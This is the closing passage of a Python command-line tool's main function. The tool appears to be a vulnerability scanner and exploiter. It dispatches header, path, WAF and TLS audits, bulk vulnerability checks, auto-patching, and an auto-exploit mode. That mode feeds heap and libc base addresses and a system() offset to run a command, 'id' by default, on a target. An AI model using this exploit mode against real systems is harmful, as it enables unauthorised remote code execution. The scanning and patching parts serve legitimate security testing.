                print(f"  {step['step']}: {step['status']} — {step['detail'][:80]}")
        return 0

    # ── AUDIT ──
    if args.audit:
        host, port, vhost, use_ssl = parse_target(args.audit) or (host, port, vhost, use_ssl)
        hdrs = audit_headers(host, port, vhost=vhost, use_ssl=use_ssl)
        paths = path_discovery(host, port, vhost=vhost, use_ssl=use_ssl)
        waf = detect_waf(host, port, vhost=vhost, use_ssl=use_ssl)
        tls = tls_audit(host, port, vhost=vhost)
        out = {"target": f"{host}:{port}", "vhost": vhost, "use_ssl": use_ssl, "headers": hdrs, "paths": paths, "waf": waf, "tls": tls}

        if args.json:
            print(json.dumps(out, indent=2))
        else:
            if isinstance(hdrs, dict) and "error" not in hdrs:
                for k, v in hdrs.items():
                    if isinstance(v, dict):
                        mark = "✅" if v.get("present") else "❌"
                        val = (v.get("value") or "")[:40]
                        print(f"  {mark} {k}: {val}")
            if waf:
                print(f"  WAF: {', '.join(waf)}")
            if paths.get("paths_found"):
                print(f"  Paths: {len(paths['paths_found'])} found")
            print(f"  TLS: {' '.join(k for k, v in tls.items() if v)}")

        if args.output:
            if args.output.endswith(".json"):
                generate_json_report(out, args.output)
            else:
                generate_html_scan_report([out], args.output)
        return 0

    if args.audit_headers:
        hdrs = audit_headers(host, port, vhost=vhost, use_ssl=use_ssl)
        for k, v in hdrs.items():
            if isinstance(v, dict):
                val = (v.get("value") or "")[:60]
                print(f"{'✅' if v['present'] else '❌'} {k}: {val}")
        return 0

    if args.audit_paths:
        paths = path_discovery(host, port, vhost=vhost, use_ssl=use_ssl)
        for p in paths.get("paths_found", []):
            print(f"  {p['path']:20s} {p['status']}")
        return 0

    # ── AUTO MODES ──
    if args.auto_scan:
        auto_scan(args.auto_scan, port, args.user, args.password, args.key_path, args.output)
        return 0

    if args.auto_patch:
        auto_patch(args.auto_patch, port, args.user, args.password, args.key_path, args.dry_run)
        return 0

    if args.auto_exploit:
        parsed = parse_target(args.auto_exploit)
        if parsed:
            h, p, v, s = parsed
            result = auto_exploit(h, p, args.cmd or "id", heap_base, libc_base,
                                 args.system_offset, parsed_offsets, vhost=v, use_ssl=s)
            if args.output:
                generate_json_report({
                    "target": f"{h}:{p}", "vhost": v, "use_ssl": s, "result": result.success,
                    "winning_addr": result.winning_addr, "error": result.error,
                }, args.output)
        return 0

    # ── BULK CHECK ──
    if args.bulk_check:
        try:
            lines = Path(args.bulk_check).read_text().splitlines()
        except OSError as e:
            print(f"[-] Cannot read bulk-check file: {e}")
            return 1
        results = bulk_fingerprint_check(lines, workers=args.workers, output=args.output)
        if args.json:
            print(json.dumps(results, indent=2, default=str))
        else:
            print_scan_results(results)
            vuln_n = sum(1 for r in results if r.get("vulnerable"))
            safe_n = sum(1 for r in results if r.get("vulnerable") is False)
            print(f"\n[summary] total={len(results)}  vuln={vuln_n}  safe={safe_n}")
        return 1 if any(r.get("vulnerable") for r in results) else 0

    # No mode selected
    parser.print_help()
    return 0


if __name__ == "__main__":
    sys.exit(main())
